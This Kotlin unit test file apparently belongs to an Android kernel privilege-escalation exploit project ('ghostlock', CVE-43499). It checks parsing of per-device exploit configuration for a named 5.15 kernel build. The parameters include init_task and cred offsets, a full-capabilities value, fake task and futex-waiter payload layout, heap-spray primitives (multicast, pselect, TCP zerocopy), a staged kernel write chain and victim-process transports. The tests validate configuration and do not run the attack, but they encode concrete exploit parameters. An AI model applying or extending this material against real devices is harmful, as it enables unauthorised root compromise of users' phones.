package com.ghostlock.app.backend.backends.cve43499.config

import com.ghostlock.app.backend.backends.cve43499.config.Cve43499DebugConfig
import com.ghostlock.app.backend.backends.cve43499.config.Cve43499DebugConfigException
import com.ghostlock.app.backend.backends.cve43499.config.DebugInjection
import com.ghostlock.app.backend.backends.cve43499.config.DebugPrimitiveKind
import com.ghostlock.app.backend.backends.cve43499.config.DebugVictimTransport
import com.ghostlock.app.backend.backends.cve43499.generator.Cve43499GeneratorContext
import com.ghostlock.app.backend.backends.cve43499.generator.Cve43499GeneratorException
import com.ghostlock.app.backend.backends.cve43499.generator.Cve43499RouteGeneratorFactory

import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499WriteChainPolicy
import com.ghostlock.app.jni.Native43499ActorSetup
import com.ghostlock.app.jni.Native43499MulticastSpec
import com.ghostlock.app.jni.Native43499PlacementRequest
import java.io.File
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Assert.fail
import org.junit.Test

/**
 * P0b（task-37）debug 参数源与 RequestFactory fail-closed 单测（纯 JVM，无 Robolectric）。
 *
 * @note 数据源 = **debug source set** 的 `app/src/debug/assets/profile/43499/debug-a301so.conf`（直接读文件）；
 *   不接 profile registry、不启用 pselect/TCP。
 */
class Cve43499DebugConfigTest {

    @Test
    fun `reads A301SO debug config`() {
        val parsed = Cve43499DebugConfig.parse(readDebugAsset())
        assertEquals("5.15.189-android13-8-00016-g51bba4309aac-ab14546557", parsed.release)
        assertEquals(5, parsed.kernelMajor)
        assertEquals(96, parsed.route.waiterOff)
        assertEquals(264, parsed.route.bufferSize)
        assertEquals(48, parsed.route.taskOffset)
        assertEquals(56, parsed.route.lockOffset)
        assertEquals(1, parsed.route.compactWaiter)
        assertEquals(46412800L, parsed.offsets.initTask)
        assertEquals(2180L, parsed.taskStruct.piLock)
        assertEquals(176L, parsed.cred.copySize)
        assertEquals(2_199_023_255_551L, parsed.cred.capsValue)
        assertEquals(8, parsed.kernelsnitch.collisions)
        assertEquals(1024L, parsed.kernelsnitch.mmStructSz)
    }

    @Test
    fun `reads R3b injection selection and generator parameters`() {
        val parsed = Cve43499DebugConfig.parse(readDebugAsset())
        assertEquals(DebugPrimitiveKind.MULTICAST, parsed.injection.primitive)
        /* R4/批 B2：默认 victim 传输 = 旧 ProcessVictim 路径（行为不变）。 */
        assertEquals(DebugVictimTransport.PROCESS, parsed.injection.victim)

        /* 与 legacy/legacy2 常量逐项对拍（这些值决定 stamp/payload/fdset/frame 布局）。 */
        val generator = parsed.generator
        assertEquals(0xffffff8000000000uL.toLong(), generator.addressModel.directMapBase)
        assertEquals(0xa8000000L, generator.addressModel.kernelPhysLoad)
        assertEquals(0x80000000L, generator.addressModel.kernelPhysOffset)
        assertEquals(0xe80L, generator.payload.lockOff)
        assertEquals(0x1180L, generator.payload.w0Off)
        assertEquals(0x1240L, generator.payload.rightOff)
        assertEquals(0x1260L, generator.payload.leftOff)
        assertEquals(0x1280L, generator.payload.fakeTaskOff)
        assertEquals(-0xe80L, generator.payload.skbDataDelta)
        assertEquals(0L, generator.payload.skbFragBias)
        assertEquals(0L, generator.payload.tcpPayloadDelta)
        assertEquals(0xe80L, generator.payload.tcpChunkBias)
        assertEquals(0x5800L, generator.payload.tcpFakeTaskOff)
        assertEquals(1, generator.payload.compactWaiter)
        assertEquals(0x40L, generator.payload.fakeTaskUsageOff)
        assertEquals(120L, generator.payload.fakeTaskPrio)
        assertEquals(140L, generator.payload.fakeWaiterPrio)
        assertEquals(0x100L, generator.payload.writeValueOffset)
        assertEquals(16L, generator.payload.pageAcceptBit)
        assertEquals(264L, generator.multicast.frameSize)
        assertEquals(8L, generator.multicast.familyOffset)
        assertEquals(0, generator.multicast.stampFamily)
        assertEquals(1, generator.multicast.disarmRequired)
        assertEquals(0x80000000L, generator.multicast.futexWaiterFlag)
        assertEquals(320L, generator.pselect.nfds)
        assertEquals(320L, generator.pselect.maxNfds)
        assertEquals(4L, generator.pselect.operationBudget)
        assertEquals(800_000_000L, generator.pselect.timeoutNanos)
        assertEquals(0L, generator.pselect.perAttemptDelayNs)
        assertEquals(50_000_000L, generator.pselect.enterDelayNs)
        assertEquals(64L, generator.pselect.fdReserveStride)
        assertEquals(0L, generator.pselect.selectUseTimeval)
        assertEquals(-2L, generator.pselect.waiterShift)
        assertEquals(16L * 1024L * 1024L, generator.tcp.mappingSize)
        assertEquals(0x40L, generator.tcp.frameSize)
        assertEquals(64L, generator.tcp.receiveSize)
        assertEquals(2000L, generator.tcp.operationBudget)
        assertEquals(10_000_000L, generator.tcp.punchSpin)
        assertEquals(10_000_000L, generator.tcp.punchPhaseSpin)
        assertEquals(20_000L, generator.tcp.postHoldIterations)
        assertEquals(16L, generator.tcp.armSequence)
        assertEquals(0x18L, generator.tcp.zcAddressOffset)
        assertEquals(0x20L, generator.tcp.zcLengthOffset)
        assertEquals(0x28L, generator.tcp.zcTaskOffset)
        assertEquals(0x30L, generator.tcp.zcLockOffset)
        assertEquals(0x33L, generator.tcp.sendFillByte)
        assertEquals(0x55L, generator.tcp.mappingFillByte)
        /* R3d：Credential 写布局的 image 域基址与 cred 镜像槽（legacy 目标常量）。 */
        assertEquals(0xffffffc008000000uL.toLong(), generator.credential.imageTextBase)
        assertEquals(0x1080L, generator.credential.copyOffset)
        assertEquals(0x6800L, generator.credential.tcpCopyOffset)
    }

    @Test
    fun `write chain parameters are self consistent and route specialized`() {
        val parsed = Cve43499DebugConfig.parse(readDebugAsset())
        val parameters = Cve43499DebugConfig.writeChainParameters()
        val multicast = Cve43499WriteChainPolicy.fromDebug(
            parameters,
            DebugPrimitiveKind.MULTICAST,
        )
        /* legacy：multicast 的 W1 尝试固定 1；W1b/fast-repair 是 multicast 专属；
         * W3 非精确 target（需要 leaf 方向探针）。 */
        assertEquals(1, multicast.w1Attempts)
        assertTrue(multicast.w1bEnabled)
        assertTrue(multicast.fastRepairEnabled)
        assertEquals(3, multicast.w1bWrites)
        assertEquals(false, multicast.w3ExactTarget)
        assertEquals(0L, multicast.threadInfoFlagsOffset)
        assertTrue(multicast.validate() == null)

        val pselect = Cve43499WriteChainPolicy.fromDebug(
            parameters,
            DebugPrimitiveKind.PSELECT,
        )
        assertEquals(15, pselect.w1Attempts)
        assertEquals(false, pselect.w1bEnabled)
        assertEquals(false, pselect.fastRepairEnabled)
        assertEquals(false, pselect.w3ExactTarget)

        val tcp = Cve43499WriteChainPolicy.fromDebug(
            parameters,
            DebugPrimitiveKind.TCP_ZEROCOPY,
        )
        assertEquals(15, tcp.w1Attempts)
        assertEquals(true, tcp.w3ExactTarget)

        /* 与 Native actor_setup 校验同形：fast-repair PI 自旋 ≤ 等待窗口。 */
        assertTrue(parameters.fastRepairLockPiSpinNs <= parameters.fastRepairParkedTimeoutNanos)
        assertEquals(0, parsed.injection.primitive.compareTo(DebugPrimitiveKind.MULTICAST))
    }

    @Test
    fun `missing generator key fails closed with named reason`() {
        val text = readDebugAsset().replace("    frame_size = 264\n", "")
        try {
            Cve43499DebugConfig.parse(text)
            fail("missing generator key must be rejected")
        } catch (problem: Cve43499DebugConfigException) {
            assertTrue(problem.message.startsWith("debug-config-missing:generator.multicast.frame_size"))
        }
    }

    @Test
    fun `unknown injection primitive fails closed`() {
        val text = readDebugAsset().replace(
            "primitive = \"multicast\"",
            "primitive = \"unknown-route\"",
        )
        try {
            Cve43499DebugConfig.parse(text)
            fail("unknown injection primitive must be rejected")
        } catch (problem: Cve43499DebugConfigException) {
            assertTrue(problem.message.startsWith("debug-config-invalid:injection.primitive"))
        }
    }

    @Test
    fun `missing key fails closed with named reason`() {
        val text = readDebugAsset().replace("^release = .*$".toRegex(RegexOption.MULTILINE), "")
        try {
            Cve43499DebugConfig.parse(text)
            fail("missing key must be rejected")
        } catch (problem: Cve43499DebugConfigException) {
            assertTrue(problem.message.startsWith("debug-config-missing:release"))
        }
    }

    @Test
    fun `bad type fails closed with named reason`() {
        val text = readDebugAsset().replace("waiter_off = 96", "waiter_off = \"bad\"")
        try {
            Cve43499DebugConfig.parse(text)
            fail("bad type must be rejected")
        } catch (problem: Cve43499DebugConfigException) {
            assertTrue(problem.message.startsWith("debug-config-bad-type:"))
        }
    }

    @Test
    fun `execution parameters are self consistent`() {
        val execution = Cve43499DebugConfig.executionParameters()
        assertEquals(0L, execution.allocationSize % execution.mmStructSize)
        assertEquals(32, (execution.allocationSize / execution.mmStructSize).toInt())
        assertEquals(execution.reclaimPayloadSize, execution.allocationSize * 2)
        assertEquals(3, execution.threadCount)
        assertTrue(execution.consumerBurst <= execution.consumerMax)
        assertTrue(execution.scanLowerBound < execution.scanUpperBound)
        /* R2（A 决策）：容量/协议字段自洽，Native 无同名默认常量。 */
        assertTrue(execution.identityStart >= execution.scanLowerBound)
        assertTrue(execution.identityEnd <= execution.scanUpperBound)
        assertTrue(execution.identityStart < execution.identityEnd)
        assertEquals(0xfL, execution.leakTagNibble)
        assertEquals(56L, execution.leakTagShift)
        assertTrue(execution.allocationSize * 2L <= execution.stagingCapacity)
        assertTrue(execution.objectsPerSlab.toString().isNotEmpty())
        assertTrue(execution.maxContextEntries > 0L)
        assertTrue(execution.maxObjectsPerSlab >= execution.objectsPerSlab.toLong())
        assertTrue(execution.scanRoundLimit <= execution.maxMeasurementRounds)
    }

    @Test
    fun `DTOs carry no physical defaults`() {
        assertNoDefaultConstructor(
            Native43499PlacementRequest::class.java.constructors,
            Native43499PlacementRequest::class.java.declaredFields.size,
        )
        assertNoDefaultConstructor(
            Native43499ActorSetup::class.java.constructors,
            Native43499ActorSetup::class.java.declaredFields.size,
        )
        assertNoDefaultConstructor(
            Native43499MulticastSpec::class.java.constructors,
            Native43499MulticastSpec::class.java.declaredFields.size,
        )
        assertNoDefaultConstructor(
            com.ghostlock.app.jni.Native43499PselectSpec::class.java.constructors,
            com.ghostlock.app.jni.Native43499PselectSpec::class.java.declaredFields.size,
        )
        assertNoDefaultConstructor(
            com.ghostlock.app.jni.Native43499TcpZerocopySpec::class.java.constructors,
            com.ghostlock.app.jni.Native43499TcpZerocopySpec::class.java.declaredFields.size,
        )
    }

    @Test
    fun `route generator factory refuses invalid ghost pid`() {
        val debug = Cve43499DebugConfig.parse(readDebugAsset())
        try {
            Cve43499RouteGeneratorFactory.create(debug, Cve43499DebugConfig.executionParameters(), 0)
            fail("ghost pid <= 0 must be rejected")
        } catch (problem: Cve43499GeneratorException) {
            assertEquals("multicast:ghost-pid", problem.reason)
        }
    }

    @Test
    fun `parses perf section with enabled zero by default`() {
        val parsed = Cve43499DebugConfig.parse(readDebugAsset())
        val perf = requireNotNull(parsed.perf)
        assertEquals(0, perf.enabled)
        assertEquals(1L, perf.attrType)
        assertEquals(262145L, perf.attrSampleType)
        assertEquals(0xFFFFFFFFL, perf.attrSampleRegsIntr)
        assertEquals(64L, perf.ringPages)
        assertEquals(3, perf.maxPasses)
        assertEquals(64L, perf.minVotesFloor)
        assertEquals(0.25, perf.minVotesRatio, 0.0)
        assertEquals(0x200L, perf.taskAlignment)
        assertEquals(31, perf.spRegisterIndex)
        assertEquals(0, perf.requireAlignment)
        assertEquals(0, perf.requireSpEvidence)
    }

    @Test
    fun `parses jni spawn victim transport`() {
        val asset = readDebugAsset().replace(
            "victim = \"process\"",
            "victim = \"jni-spawn\"",
        )
        val parsed = Cve43499DebugConfig.parse(asset)
        assertEquals(DebugVictimTransport.JNI_SPAWN, parsed.injection.victim)
    }

    @Test
    fun `unknown victim transport fails closed`() {
        val asset = readDebugAsset().replace(
            "victim = \"process\"",
            "victim = \"shell-helper\"",
        )
        try {
            Cve43499DebugConfig.parse(asset)
            fail("unknown injection.victim must be rejected")
        } catch (problem: Cve43499DebugConfigException) {
            assertEquals(
                "debug-config-invalid:injection.victim:shell-helper",
                problem.message,
            )
        }
    }

    @Test
    fun `write target override is optional hex and applies to w1 only`() {
        val injected = readMondrianDebugAsset().replace(
            "  # write_target_override = \"0x1000\"",
            "  write_target_override = \"0x1000\"",
        )
        val debug = Cve43499DebugConfig.parse(injected)
        assertEquals(0x1000L, debug.generator.writeTargetOverride)
        val execution = Cve43499DebugConfig.executionParameters(debug)
        val context = Cve43499GeneratorContext(debug, execution, 4242)
        assertEquals(0x1000L, context.w1WriteRequest().target)
        /* 其它阶段保持原 target（w1b 用 page+buffer，不受覆盖影响）。 */
        assertEquals(
            context.w1bWriteRequest(0xffffff8800210000uL.toLong()).target,
            0xffffff8800210000uL.toLong() + debug.route.bufferSize,
        )

        /* 0/unset 视为不覆盖（task-119 兼容写法）。 */
        val unsetNumber = readMondrianDebugAsset().replace(
            "  # write_target_override = \"0x1000\"",
            "  write_target_override = 0",
        )
        assertNull(Cve43499DebugConfig.parse(unsetNumber).generator.writeTargetOverride)
        val unsetText = readMondrianDebugAsset().replace(
            "  # write_target_override = \"0x1000\"",
            "  write_target_override = unset",
        )
        assertNull(Cve43499DebugConfig.parse(unsetText).generator.writeTargetOverride)

        val invalid = injected.replace("write_target_override = \"0x1000\"", "write_target_override = \"not-hex\"")
        try {
            Cve43499DebugConfig.parse(invalid)
            fail("invalid write_target_override must fail closed")
        } catch (problem: Cve43499DebugConfigException) {
            assertTrue(problem.message?.contains("write_target_override") == true)
        }
    }

    @Test
    fun `missing victim transport key fails closed`() {
        val asset = readDebugAsset().replace(
            Regex("(?m)^[ \\t]*victim[ \\t]*=[ \\t]*\"process\"[^\\n]*\\n"),
            "",
        )
        try {
            Cve43499DebugConfig.parse(asset)
            fail("missing injection.victim must be rejected")
        } catch (problem: Cve43499DebugConfigException) {
            assertTrue(
                problem.message?.contains("injection.victim") == true,
            )
        }
    }

    @Test
    fun `missing perf section disables perf path`() {
        val withoutPerf = readDebugAsset().substringBefore("\nperf {")
        assertNull(Cve43499DebugConfig.parse(withoutPerf).perf)
    }

    private fun readMondrianDebugAsset(): String {
        val candidates = listOf(
            File("src/debug/assets/profile/43499/debug-mondrian.conf"),
            File("../src/debug/assets/profile/43499/debug-mondrian.conf"),
            File("app/src/debug/assets/profile/43499/debug-mondrian.conf"),
        )
        return candidates.firstOrNull { it.isFile }?.readText()
            ?: error("mondrian debug asset not found from ${File(".").absolutePath}")
    }

    private fun readDebugAsset(): String {
        val candidates = listOf(
            File("src/debug/assets/profile/43499/debug-a301so.conf"),
            File("../src/debug/assets/profile/43499/debug-a301so.conf"),
            File("app/src/debug/assets/profile/43499/debug-a301so.conf"),
        )
        val file = candidates.firstOrNull { it.isFile }
            ?: error("debug asset not found from ${File(".").absolutePath}")
        return file.readText()
    }

    private fun assertNoDefaultConstructor(
        constructors: Array<java.lang.reflect.Constructor<*>>,
        fieldCount: Int,
    ) {
        val hasSyntheticDefault = constructors.any { constructor ->
            val parameters = constructor.parameterTypes
            parameters.size == fieldCount + 2 &&
                parameters.last().name == "kotlin.jvm.internal.DefaultConstructorMarker"
        }
        assertTrue("DTO must not define default parameter values", !hasSyntheticDefault)
    }
}
